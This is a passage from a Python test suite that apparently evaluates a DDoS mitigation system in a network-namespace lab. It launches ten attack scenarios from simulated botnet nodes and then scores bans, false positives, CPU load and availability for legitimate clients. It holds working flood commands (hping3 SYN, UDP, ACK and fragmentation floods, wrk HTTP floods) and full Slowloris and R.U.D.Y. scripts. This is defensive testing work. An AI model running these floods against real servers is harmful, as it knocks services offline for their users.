                    rx_b = int(res_b.stdout.strip())
                    return rx_p, rx_b
                except:
                    return 0, 0

            # 2+3+4. One aligned ~1s window: CPU (per-core + total), softirqs,
            # and PPS are all bracketed by the SAME sleep, so HotCore_CPU_Pct is
            # consistent with CPU_Total (fixes audit 5b). CPU comes from
            # /proc/stat jiffie deltas rather than psutil's two offset windows.
            _, core_before = _read_cpu_jiffies()
            softirq_before = _read_softirqs_net_rx()
            ip_rx1 = _read_ip_inreceives()
            rx_p1, rx_b1 = read_stats()
            time.sleep(1.0)
            rx_p2, rx_b2 = read_stats()
            ip_rx2 = _read_ip_inreceives()
            softirq_after = _read_softirqs_net_rx()
            _, core_after = _read_cpu_jiffies()

            if core_before and core_after and len(core_before) == len(core_after):
                per_core = [_cpu_busy_pct(b, a) for b, a in zip(core_before, core_after)]
            else:
                per_core = []
            # CPU_Total = unweighted MEAN of per-core busy%. The /proc/stat aggregate
            # line jiffie-weights cores, which under-represents a single saturated
            # core on a tickless kernel (a busy core accrues fewer jiffies than an
            # idle one). The mean gives the intuitive "fraction of total CPU in use":
            # one fully-pegged core out of 8 -> 12.5%.
            cpu_total = (sum(per_core) / len(per_core)) if per_core else 0.0

            # 5. Compute NET_RX softirq deltas
            if softirq_before and softirq_after and len(softirq_before) == len(softirq_after):
                softirq_delta = [a - b for a, b in zip(softirq_after, softirq_before)]
                softirq_total = sum(softirq_delta)
                hot_core_id = softirq_delta.index(max(softirq_delta))
                hot_core_softirq = softirq_delta[hot_core_id]
                hot_core_cpu = per_core[hot_core_id] if hot_core_id < len(per_core) else 0.0
            else:
                softirq_total = 0
                hot_core_softirq = 0
                hot_core_id = -1
                hot_core_cpu = 0.0

            # 6. Read per-process CPU (now has a 1s baseline from the prime above)
            for p in daemon_procs:
                try:
                    daemon_cpu += p.cpu_percent(interval=None)
                    daemon_ram += p.memory_info().rss / (1024 * 1024)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            for p in nginx_procs:
                try:
                    nginx_cpu += p.cpu_percent(interval=None)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            mem_total = psutil.virtual_memory().used / (1024 * 1024)
            # 7. TCP State (Server NS)
            tcp_estab = tcp_tw = tcp_syn = 0
            ss_res = run(["ss", "-tan"], ns=SERVER_NS)
            if ss_res and ss_res.stdout:
                tcp_estab = ss_res.stdout.count("ESTAB")
                tcp_tw = ss_res.stdout.count("TIME-WAIT")
                tcp_syn = ss_res.stdout.count("SYN-RECV")

            pps = rx_p2 - rx_p1
            bps = rx_b2 - rx_b1
            # Stack-penetration metrics (fairness: isolate WHERE each backend drops)
            ip_inreceives = max(0, ip_rx2 - ip_rx1)       # packets that reached the IP layer
            prestack_dropped = max(0, pps - ip_inreceives)  # dropped before the stack (XDP)

            # 8. Save to CSV (extended with 4 new kernel metrics columns)
            mode = os.environ.get("MITIGATION_MODE", "active")
            backend = os.environ.get("MITIGATION_BACKEND", "xdp")
            if mode == "none":
                csv_file = "/tmp/metrics_unprotected.csv"
            elif backend == "iptables":
                csv_file = "/tmp/metrics_iptables.csv"
            else:
                csv_file = "/tmp/mitigation_performance.csv"
            file_exists = os.path.isfile(csv_file)
            with open(csv_file, "a", newline='') as f:
                writer = csv.writer(f)
                if not file_exists:
                    writer.writerow(["Timestamp", "Scenario", "Phase", "CPU_Total_Pct", 
                                    "CPU_Daemon_Pct", "CPU_Nginx_Pct", "RAM_Total_MB", 
                                    "RAM_Daemon_MB", "TCP_Estab", "TCP_TimeWait", 
                                    "TCP_SynRecv", "PPS_Rx", "Bps_Rx",
                                    "SoftIRQ_NET_RX_Total", "SoftIRQ_NET_RX_HotCore",
                                    "HotCore_ID", "HotCore_CPU_Pct",
                                    "IP_InReceives", "PreStack_Dropped"])
                writer.writerow([
                    datetime.datetime.now().isoformat(),
                    scenario, phase,
                    f"{cpu_total:.1f}", f"{daemon_cpu:.1f}", f"{nginx_cpu:.1f}",
                    f"{mem_total:.1f}", f"{daemon_ram:.1f}",
                    tcp_estab, tcp_tw, tcp_syn, pps, bps,
                    softirq_total, hot_core_softirq,
                    hot_core_id, f"{hot_core_cpu:.1f}",
                    ip_inreceives, prestack_dropped
                ])
                
        except Exception as e:
            print(f"Error capturing metrics: {e}")

    task()   # synchronous: block for the full measurement window (see docstring)

def check_collateral_damage(legit_nodes):
    """Verify that NO legitimate user IP is banned.

    Returns: (ok: bool, banned_list: [(ip, profile)])
    """
    banned_legit = []
    for ns, ip, profile in legit_nodes:
        if is_ip_banned(ns):
            banned_legit.append((ip, profile))
    return (len(banned_legit) == 0), banned_legit


def verify_legit_http(legit_nodes, sample_size=15):
    """Verify HTTP connectivity from a random sample of legitimate users.

    Returns: (success, fail, total)
    """
    sample = random.sample(legit_nodes, min(sample_size, len(legit_nodes)))
    success = fail = 0
    for ns, ip, _ in sample:
        success_for_this = False
        for attempt in range(3):
            res = run(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                       "--max-time", "15", HTTP_URL], ns=ns, timeout=20)
            if res and res.stdout.strip() == "200":
                success_for_this = True
                break
            time.sleep(1)
            
        if success_for_this:
            success += 1
        else:
            fail += 1
    return success, fail, len(sample)


# ═══════════════════════════════════════════════════════════════════════════════
#  ATTACK HELPERS
# ═══════════════════════════════════════════════════════════════════════════════

def launch_botnet(botnet_nodes, cmd_func):
    """Launch an attack from every botnet node concurrently.

    cmd_func(ns, ip) → subprocess.Popen or None.
    Returns list of (proc, ns, ip).
    """
    procs = []
    for ns, ip in botnet_nodes:
        p = cmd_func(ns, ip)
        if p:
            procs.append((p, ns, ip))
    return procs


def kill_procs(procs):
    """Kill all attack processes."""
    for p, ns, _ in procs:
        try:
            p.kill()
            p.wait(timeout=2)
        except Exception:
            pass
        run("pkill -9 -f hping3", ns=ns)
        run("pkill -9 -f wrk", ns=ns)
        run("pkill -9 -f _dist_", ns=ns)


def _write_script(path, content):
    with open(path, "w") as f:
        f.write(content)
    os.chmod(path, 0o755)


# ═══════════════════════════════════════════════════════════════════════════════
#  REPORT
# ═══════════════════════════════════════════════════════════════════════════════

def report(name, ban_results, botnet_nodes, legit_nodes):
    """Evaluate and display results for a distributed attack scenario."""
    _avail_finalize()   # aggregate availability FIRST (bounds 'after' to the post-kill window,
                        # before the collateral/HTTP verification curls run below)
    botnet_ips = [ip for _, ip in botnet_nodes]
    banned_cnt = sum(1 for ip in botnet_ips if ban_results[ip][0] != "None")
    total = len(botnet_ips)

    ttm_vals = [ban_results[ip][1] for ip in botnet_ips
                if ban_results[ip][1] is not None]
    avg_ttm = sum(ttm_vals) / len(ttm_vals) if ttm_vals else None

    engines = set(ban_results[ip][0] for ip in botnet_ips
                  if ban_results[ip][0] != "None")

    col_ok, col_list = check_collateral_damage(legit_nodes)
    http_ok, http_fail, http_total = verify_legit_http(legit_nodes)

    eff_pass  = banned_cnt >= total * 0.8
    col_pass  = col_ok
    http_pass = http_fail == 0
    overall   = eff_pass and col_pass and http_pass

    tag = f"{GREEN}PASS{RESET}" if overall else f"{RED}FAIL{RESET}"

    print(f"\n  [{tag}] {BOLD}{name}{RESET}")
    print(f"  ├── Botnet banned:     {banned_cnt}/{total} "
          f"({'✅' if eff_pass else '❌'})")
    if avg_ttm is not None:
        print(f"  ├── Avg TTM:           {avg_ttm:.2f}s")
    else:
        print(f"  ├── Avg TTM:           N/A")
    print(f"  ├── Engines:           {', '.join(engines) if engines else 'None'}")
    print(f"  ├── Legit HTTP:        {http_ok}/{http_total} OK "
          f"({'✅' if http_pass else '❌'})")
    if _avail_results:                       # continuous service-availability (reporting-only)
        print(_avail_results[-1]["line"])
    fp_str = "None ✅" if col_pass else f"{len(col_list)} BANNED ❌"
    print(f"  └── False Positives:   {fp_str}")
    if col_list:
        for lip, lprof in col_list:
            print(f"       └── FP: {lip} (profile: {lprof})")

    results.append({
        "scenario": name,
        "banned": f"{banned_cnt}/{total}",
        "avg_ttm": f"{avg_ttm:.2f}s" if avg_ttm else "N/A",
        "engines": ", ".join(engines) if engines else "None",
        "fp": "Clean" if col_pass else f"{len(col_list)} FP",
        "result": "PASS" if overall else "FAIL",
    })


# ═══════════════════════════════════════════════════════════════════════════════
#  ATTACK SCENARIOS
# ═══════════════════════════════════════════════════════════════════════════════

def scenario_syn_flood(botnet, legit):
    """S1: Distributed high-rate SYN flood."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 1: Distributed SYN Flood (1000 SYN/s per bot)")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed SYN Flood", "Phase 1: Baseline")
    attack_start = time.time()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -S -p 80 -i u1000 {SERVER_IP}", ns=ns, bg=True))
    capture_metrics("Distributed SYN Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed SYN Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed SYN Flood", bans, botnet, legit)


def scenario_slow_syn(botnet, legit):
    """S2: Distributed low-and-slow SYN flood (10 SYN/s — GRU ML target)."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 2: Distributed Low & Slow SYN (GRU ML Target)")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed Low & Slow SYN", "Phase 1: Baseline")
    attack_start = time.time()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -S -p 80 -i u100000 {SERVER_IP}", ns=ns, bg=True))
    capture_metrics("Distributed Low & Slow SYN", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=30, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed Low & Slow SYN", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed Low & Slow SYN", bans, botnet, legit)


def scenario_udp_flood(botnet, legit):
    """S3: Distributed high-rate UDP flood."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 3: Distributed UDP Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed UDP Flood", "Phase 1: Baseline")
    attack_start = time.time()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 --udp -p 80 --flood {SERVER_IP}", ns=ns, bg=True))
    capture_metrics("Distributed UDP Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10, attack_start=attack_start, log_start_pos=log_pos)
    # ── Sustained Stress Window: measure CPU while bans actively DROP flood traffic ──
    print(f"    {CYAN}[*] Sustained stress measurement (10s)...{RESET}")
    for i in range(3):
        time.sleep(3)
        capture_metrics("Distributed UDP Flood", f"Phase 2A: Sustained Stress ({i+1}/3)")
    time.sleep(1)
    # ── End Sustained Stress ──
    capture_metrics("Distributed UDP Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed UDP Flood", bans, botnet, legit)


def scenario_http_flood(botnet, legit):
    """S4: Distributed HTTP flood using wrk."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 4: Distributed HTTP Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed HTTP Flood", "Phase 1: Baseline")
    attack_start = time.time()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"wrk -t2 -c50 -d30s {HTTP_URL}", ns=ns, bg=True))
    capture_metrics("Distributed HTTP Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=15, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed HTTP Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed HTTP Flood", bans, botnet, legit)


def scenario_ack_flood(botnet, legit):
    """S5: Distributed ACK flood (TCP state exhaustion)."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 5: Distributed ACK Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed ACK Flood", "Phase 1: Baseline")
    attack_start = time.time()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -A -p 80 --flood {SERVER_IP}", ns=ns, bg=True))
    capture_metrics("Distributed ACK Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10, attack_start=attack_start, log_start_pos=log_pos)
    # ── Sustained Stress Window: measure CPU while bans actively DROP flood traffic ──
    print(f"    {CYAN}[*] Sustained stress measurement (10s)...{RESET}")
    for i in range(3):
        time.sleep(3)
        capture_metrics("Distributed ACK Flood", f"Phase 2A: Sustained Stress ({i+1}/3)")
    time.sleep(1)
    # ── End Sustained Stress ──
    capture_metrics("Distributed ACK Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed ACK Flood", bans, botnet, legit)


def scenario_fragmentation(botnet, legit):
    """S6: Distributed IP fragmentation flood."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 6: Distributed IP Fragmentation Flood")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed IP Fragmentation Flood", "Phase 1: Baseline")
    attack_start = time.time()
    log_pos = _get_log_size()
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"hping3 -S -p 80 -f --fragoff 20 --flood {SERVER_IP}",
            ns=ns, bg=True))
    capture_metrics("Distributed IP Fragmentation Flood", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=10, attack_start=attack_start, log_start_pos=log_pos)
    # ── Sustained Stress Window: measure CPU while bans actively DROP flood traffic ──
    print(f"    {CYAN}[*] Sustained stress measurement (10s)...{RESET}")
    for i in range(3):
        time.sleep(3)
        capture_metrics("Distributed IP Fragmentation Flood", f"Phase 2A: Sustained Stress ({i+1}/3)")
    time.sleep(1)
    # ── End Sustained Stress ──
    capture_metrics("Distributed IP Fragmentation Flood", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed Fragmentation", bans, botnet, legit)


def scenario_slowloris(botnet, legit):
    """S7: Distributed Slowloris from all botnet nodes."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 7: Distributed Slowloris")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed Slowloris", "Phase 1: Baseline")
    attack_start = time.time()
    log_pos = _get_log_size()
    script = "/tmp/_dist_slowloris.py"
    _write_script(script, f'''import socket, random, time
TARGET = "{SERVER_IP}"; PORT = 80; N = 8; SLEEP = 5; socks = []
def mk():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((TARGET, PORT))
        s.send(f"GET /?r={{random.randint(0,9999)}} HTTP/1.1\\r\\n".encode())
        s.send(f"Host: {{TARGET}}\\r\\n".encode())
        s.send("User-Agent: SL\\r\\nAccept-language: en\\r\\n".encode())
        return s
    except: return None
for _ in range(N):
    s = mk()
    if s: socks.append(s)
while True:
    for s in list(socks):
        try: s.send(f"X-a: {{random.randint(1,9999)}}\\r\\n".encode())
        except: socks.remove(s)
    for _ in range(N - len(socks)):
        s = mk()
        if s: socks.append(s)
    time.sleep(SLEEP)
''')
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"python3 {script}", ns=ns, bg=True))
    capture_metrics("Distributed Slowloris", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=40, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed Slowloris", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed Slowloris", bans, botnet, legit)


def scenario_rudy(botnet, legit):
    """S8: Distributed R.U.D.Y. (Slow POST) from all botnet nodes."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 8: Distributed R.U.D.Y. (Slow POST)")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed R.U.D.Y.", "Phase 1: Baseline")
    attack_start = time.time()
    log_pos = _get_log_size()
    script = "/tmp/_dist_rudy.py"
    _write_script(script, f'''import socket, random, time
TARGET = "{SERVER_IP}"; PORT = 80; N = 10; SLEEP = 7; socks = []
def mk():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((TARGET, PORT))
        s.send(f"POST /?r={{random.randint(0,9999)}} HTTP/1.1\\r\\n".encode())
        s.send(f"Host: {{TARGET}}\\r\\n".encode())
        s.send("User-Agent: RD\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n".encode())
        s.send("Content-Length: 1000000\\r\\nConnection: keep-alive\\r\\n\\r\\n".encode())
        return s
    except: return None
for _ in range(N):
    s = mk()
    if s: socks.append(s)
while True:
    for s in list(socks):
        try: s.send(b"a")
        except: socks.remove(s)
    for _ in range(N - len(socks)):
        s = mk()
        if s: socks.append(s)
    time.sleep(SLEEP)
''')
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"python3 {script}", ns=ns, bg=True))
    capture_metrics("Distributed R.U.D.Y.", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=40, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed R.U.D.Y.", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed R.U.D.Y.", bans, botnet, legit)


def scenario_yoyo(botnet, legit):
    """S9: Distributed Yo-Yo (pulsing) attack."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 9: Distributed Yo-Yo (Pulsing) Attack")
    print(f"{'='*70}{RESET}")
    capture_metrics("Distributed Yo-Yo", "Phase 1: Baseline")
    attack_start = time.time()
    log_pos = _get_log_size()
    script = "/tmp/_dist_yoyo.sh"
    _write_script(script, f"""#!/bin/bash
while true; do
    wrk -t2 -c50 -d2s {HTTP_URL} > /dev/null 2>&1
    sleep 6
done
""")
    procs = launch_botnet(botnet, lambda ns, ip:
        run(f"bash {script}", ns=ns, bg=True))
    capture_metrics("Distributed Yo-Yo", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=25, attack_start=attack_start, log_start_pos=log_pos)
    capture_metrics("Distributed Yo-Yo", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Distributed Yo-Yo", bans, botnet, legit)


def scenario_multi_vector(botnet, legit):
    """S10: Multi-vector: bots split across SYN, HTTP, and UDP attacks."""
    print(f"\n{YELLOW}{'='*70}")
    print(f"  SCENARIO 10: Multi-Vector Distributed Attack")
    print(f"{'='*70}{RESET}")
    capture_metrics("Multi-Vector Distributed Attack", "Phase 1: Baseline")
    attack_start = time.time()
    log_pos = _get_log_size()
    procs = []
    n = len(botnet)
    third = n // 3

    for ns, ip in botnet[:third]:
        p = run(f"hping3 -S -p 80 -i u1000 {SERVER_IP}", ns=ns, bg=True)
        if p: procs.append((p, ns, ip))

    for ns, ip in botnet[third:2*third]:
        p = run(f"wrk -t2 -c50 -d30s {HTTP_URL}", ns=ns, bg=True)
        if p: procs.append((p, ns, ip))

    for ns, ip in botnet[2*third:]:
        p = run(f"hping3 --udp -p 80 --flood {SERVER_IP}", ns=ns, bg=True)
        if p: procs.append((p, ns, ip))

    capture_metrics("Multi-Vector Distributed Attack", "Phase 2: Pre-Mitigation")
    bans = tail_logs_for_bans([ip for _, ip in botnet], timeout=20, attack_start=attack_start, log_start_pos=log_pos)
    # ── Sustained Stress Window: measure CPU while bans actively DROP flood traffic ──
    print(f"    {CYAN}[*] Sustained stress measurement (10s)...{RESET}")
    for i in range(3):
        time.sleep(3)
        capture_metrics("Multi-Vector Distributed Attack", f"Phase 2A: Sustained Stress ({i+1}/3)")
    time.sleep(1)
    # ── End Sustained Stress ──
    capture_metrics("Multi-Vector Distributed Attack", "Phase 3: Post-Mitigation")
    kill_procs(procs)
    _avail_phase("after")      # attack stopped → bounded recovery window (then report() aggregates)
    time.sleep(AVAIL_AFTER_SECONDS)
    report("Multi-Vector Attack", bans, botnet, legit)


# ═══════════════════════════════════════════════════════════════════════════════
#  FINAL SUMMARY
# ═══════════════════════════════════════════════════════════════════════════════

def print_summary():
    print(f"\n{BOLD}{YELLOW}{'='*90}")
    print(f"  DISTRIBUTED TEST SUMMARY")
    print(f"{'='*90}{RESET}")
    hdr = (f"  {'Scenario':<35} | {'Banned':<10} | {'Avg TTM':<10} | "
           f"{'Engine(s)':<18} | {'FP':<8} | {'Result'}")
    print(hdr)
    print(f"  {'-'*88}")

    p = f = 0
    for r in results:
        c = GREEN if r["result"] == "PASS" else RED
        print(f"  {r['scenario']:<35} | {r['banned']:<10} | "
              f"{r['avg_ttm']:<10} | {r['engines']:<18} | "
              f"{r['fp']:<8} | {c}{r['result']}{RESET}")
        if r["result"] == "PASS":
            p += 1
        else:
            f += 1

    print(f"\n  {GREEN}Passed: {p}{RESET}  |  {RED}Failed: {f}{RESET}  |  "
          f"Total: {p + f}")

    # ── Service availability (legitimate clients, continuous) ──────────────────
    if _avail_results:
        print(f"\n{BOLD}{YELLOW}{'='*94}")
        print(f"  SERVICE AVAILABILITY (legitimate clients, continuous — before/during/after)")
        print(f"{'='*94}{RESET}")
        print(f"  {'Scenario':<32} | {'Period':<6} | {'Succ%':<6} | {'Reqs':<5} | "
              f"{'p50':<7} | {'p95':<7} | {'p99':<7} | {'TOs'}")
        print(f"  {'-'*92}")
        for r in _avail_results:
            for i, per in enumerate(("before", "during", "after")):
                k = r["by_period"][per]
                name = (r["scenario"][:32]) if i == 0 else ""
                if k["total"]:
                    col = GREEN if k["succ"] >= 99.0 else (YELLOW if k["succ"] >= 90.0 else RED)
                    succ = f"{col}{k['succ']:>5.1f}{RESET}"
                    lat = f"{k['p50']:>4.0f}ms | {k['p95']:>4.0f}ms | {k['p99']:>4.0f}ms"
                    print(f"  {name:<32} | {per:<6} | {succ} | {k['total']:<5} | "
                          f"{lat} | {k['c000']}")
                else:
                    print(f"  {name:<32} | {per:<6} | {'n/a':<6} | {0:<5} | "
                          f"{'—':<7} | {'—':<7} | {'—':<7} | 0")
        print(f"\n  {CYAN}Availability CSVs: /tmp/availability_<performance|iptables|unprotected>.csv "
              f"(+ _raw_ per-request dumps){RESET}")


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    if os.geteuid() != 0:
        print(f"{RED}[-] This script requires root privileges (sudo).{RESET}")
        sys.exit(1)

    # Dependency check
    for tool in ["hping3", "wrk", "curl", "ping", "tc", "ip", "ethtool"]:
        r = run(f"which {tool}")
        if r is None or r.returncode != 0:
            print(f"{YELLOW}[!] Warning: '{tool}' not found. "
                  f"Some tests may fail.{RESET}")

    print(f"\n{BOLD}{CYAN}"
          f"╔══════════════════════════════════════════════════════════════╗\n"
          f"║   DISTRIBUTED DDoS MITIGATION TESTING SUITE                ║\n"
          f"║   {LEGIT_COUNT} Legit Clients  |  {BOTNET_COUNT} Botnet Nodes"
          f"                      ║\n"
          f"╚══════════════════════════════════════════════════════════════╝"
          f"{RESET}\n")

    legit, botnet = build_topology()
    start_legit_traffic(legit)

    print(f"\n{CYAN}[*] Baseline settling period (5s)...{RESET}")
    time.sleep(5)

    # Ordered scenario registry. ONLY_SCENARIOS="4,7,8,9" (env) runs a subset in
    # this same order; unset → all ten, exactly as before (resets between each).
    all_scenarios = [
        (1, scenario_syn_flood), (2, scenario_slow_syn), (3, scenario_udp_flood),
        (4, scenario_http_flood), (5, scenario_ack_flood), (6, scenario_fragmentation),
        (7, scenario_slowloris), (8, scenario_rudy), (9, scenario_yoyo),
        (10, scenario_multi_vector),
    ]
    only = os.environ.get("ONLY_SCENARIOS", "").strip()
    if only:
        want = {int(x) for x in only.split(",") if x.strip()}
        run_list = [(n, fn) for n, fn in all_scenarios if n in want]
        print(f"{YELLOW}[!] ONLY_SCENARIOS={only} → running scenarios "
              f"{[n for n, _ in run_list]}{RESET}")
    else:
        run_list = all_scenarios

    try:
        for i, (_n, fn) in enumerate(run_list):
            fn(botnet, legit)
            if i < len(run_list) - 1:
                reset_between_scenarios()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user.{RESET}")
    finally:
        stop_legit_traffic()

    print_summary()


if __name__ == "__main__":
    main()
